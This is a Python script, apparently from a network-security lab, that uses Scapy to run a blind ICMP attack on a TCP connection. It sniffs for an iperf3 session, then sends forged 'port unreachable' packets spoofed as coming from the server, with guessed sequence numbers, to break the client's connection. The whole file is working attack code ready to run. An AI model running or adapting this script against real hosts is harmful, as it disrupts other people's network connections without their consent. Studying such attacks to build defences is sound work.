#!/usr/bin/env python3

import sys
import time
from scapy.all import IP, ICMP, TCP, send, sniff, conf

from pathlib import Path
sys.path.append(str(Path(__file__).resolve().parent.parent))
from colored_text import *

# DEFAULT_SERVER_IP = "192.168.0.102"
DEFAULT_SERVER_IP = "10.249.138.192"
DEFAULT_CLIENT_PORT = 40000
SERVER_PORT = 5201


CLIENT_PORT = int(sys.argv[1]) if len(sys.argv) > 1 else DEFAULT_CLIENT_PORT
CLIENT_IP = sys.argv[2] if len(sys.argv) > 2 and sys.argv[2] else None
SERVER_IP = sys.argv[3] if len(sys.argv) > 3 and sys.argv[3] else DEFAULT_SERVER_IP


def detect_client_ip(server_ip, server_port, timeout=20):

    print(
        yellow("⦿ Client IP not given - sniffing for traffic to "
               f"{server_ip}:{server_port}...")
    )

    print(
        "    Make sure the iperf3 transfer is actively running."
    )

    packets = sniff(
        filter=f"host {server_ip} and tcp port {server_port}",
        count=1,
        timeout=timeout,
    )

    if not packets:
        raise RuntimeError(
            f"No traffic to {server_ip}:{server_port} seen within "
            f"{timeout}s. Pass the client IP as the 2nd argument."
        )

    pkt_ip = packets[0][IP]

    client_ip = (
        pkt_ip.src
        if pkt_ip.dst == server_ip
        else pkt_ip.dst
    )

    print(cyan(f"⦿ Detected client IP = {client_ip}"))

    return client_ip


if CLIENT_IP is None:
    CLIENT_IP = detect_client_ip(SERVER_IP, SERVER_PORT)


# Sequence-number spacing used for the blind guesses.
ASSUMED_WINDOW = 2_600_000

SEQ_SPACE = 2 ** 32

num_guesses = 10


print(yellow("⦿ Attack configuration:"))
print("    Client       :", CLIENT_IP)
print("    Server       :", SERVER_IP)
print("    Client port  :", CLIENT_PORT)
print("    Server port  :", SERVER_PORT)


# Check which interface Scapy will use to reach the client.
route = conf.route.route(CLIENT_IP)

print(yellow("⦿ Route to client:"))
print("    interface :", route[0])
print("    gateway   :", route[2])
print("    source    :", route[1])


if route[0] == "lo":
    raise RuntimeError(
        "Scapy is routing the attack through loopback. "
        "Make sure this script is running on the attacker machine."
    )


packets = []

for i in range(num_guesses):

    seq = (i * ASSUMED_WINDOW) % SEQ_SPACE

    # TCP packet that appears to come from the client.
    offending = (
        IP(
            src=CLIENT_IP,
            dst=SERVER_IP,
            proto=6
        )
        /
        TCP(
            sport=CLIENT_PORT,
            dport=SERVER_PORT,
            flags="A",
            seq=seq,
            ack=0
        )
    )

    # ICMP error that appears to come from the server.
    forged_icmp = (
        IP(
            src=SERVER_IP,
            dst=CLIENT_IP
        )
        /
        ICMP(
            type=3,
            code=3
        )
        /
        offending
    )

    packets.append(forged_icmp)


print(
    pink("⦿ Sending %d forged ICMP packets..." % len(packets))
)

t0 = time.time()

send(
    packets,
    verbose=False
)

elapsed = time.time() - t0


print(
    cyan(
        "⦿ Sent %d packets in %.2f seconds."
        % (len(packets), elapsed)
    )
)

print(
    green(
        "⦿ Attack finished - check the client TCP connection state."
    )
)